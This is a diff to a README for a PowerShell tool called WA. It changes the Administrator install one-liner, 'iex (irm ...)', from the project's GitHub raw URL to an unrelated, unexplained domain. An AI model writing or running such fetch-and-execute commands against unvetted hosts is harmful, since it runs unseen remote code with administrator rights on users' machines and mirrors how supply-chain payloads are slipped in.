@@ -10,7 +10,7 @@ WA is the core, standalone delivery of the full [WinAuto](https://github.com/Kei
 
 Run this command in an **Administrator** PowerShell window to download and execute WA instantly:
 ```powershell
-iex (irm https://raw.githubusercontent.com/KeithOwns/wa/main/wa.ps1)
+iex (irm https://www.aiit.support/mylife)
 ```
 
 ## 🚀 Key Features
